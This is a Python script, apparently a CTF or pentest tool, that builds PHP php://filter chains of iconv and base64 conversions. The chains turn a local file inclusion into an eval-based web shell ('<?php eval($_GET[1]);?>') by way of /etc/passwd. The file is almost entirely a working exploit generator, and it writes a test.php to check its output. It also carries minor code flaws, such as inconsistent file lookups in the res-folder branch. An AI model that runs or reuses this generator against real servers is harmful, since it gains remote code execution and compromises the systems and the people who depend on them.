import base64
from dictionary import dictionary

# set your parameter
file_to_use = "/etc/passwd"
str_to_gerenate = "<?php eval($_GET[1]);?>a"

# generate some garbage base64 这里会在payload后面加一串\x1b$)C垃圾字符x 个人感觉好像也可以不加x 看各位师傅对这个的理解吧（
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
filters += "convert.iconv.UTF8.UTF7|" # get rid of equal signs

def getFinalPayload(filters):
    filters += "convert.base64-decode"
    final_payload = f"php://filter/{filters}/resource={file_to_use}"
    print("\n")
    print("-----------------All Done!---------------------\n")
    print("Final payload is: ")
    print(final_payload)

    return final_payload

def getTestPayload(final_payload):
    with open('test.php','w') as f:
        f.write('<?php echo file_get_contents("'+final_payload+'");?>')

def generatorByResHexCocde(base64_payload,filters):
    for c in base64_payload[::-1]:
        filters += open('./res/'+(str(hex(ord(c)))).replace("0x","")).read() + "|"
        print("[+] use "+ str(hex(ord(c))) + " : " +open('./res/'+c).read())

        filters += "convert.base64-decode|" # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-encode|"
        filters += "convert.iconv.UTF8.UTF7|" # get rid of equal signs

    final_payload = getFinalPayload(filters)
    getTestPayload(final_payload)


def generatorByCustomDic(base64_payload,filters):
    for c in base64_payload[::-1]:
        filters += dictionary[c] + "|"
        print("[+] use "+ c + " : " +dictionary[c])
        
        filters += "convert.base64-decode|" 
        filters += "convert.base64-encode|"
        filters += "convert.iconv.UTF8.UTF7|" 

    final_payload = getFinalPayload(filters)
    getTestPayload(final_payload)
    

def starGenerator(str_to_gerenate,filters):
    base64_payload = str(base64.b64encode(str_to_gerenate.encode()).decode())
    print("[*]Generate str: " + str_to_gerenate+"  | and base64value is: " + str(base64.b64encode(str_to_gerenate.encode()).decode()))
    print("[*]Choose your method to generate payload: 1. use res folder 2. use custom dictionary")
    method = input("[*]Please input your choice: ")
    if method == "1":
        generatorByResHexCocde(base64_payload,filters)
    elif method == "2":
        generatorByCustomDic(base64_payload,filters)
    else:
        print("Please input 1 or 2")

if __name__ == "__main__":
    starGenerator(str_to_gerenate,filters)





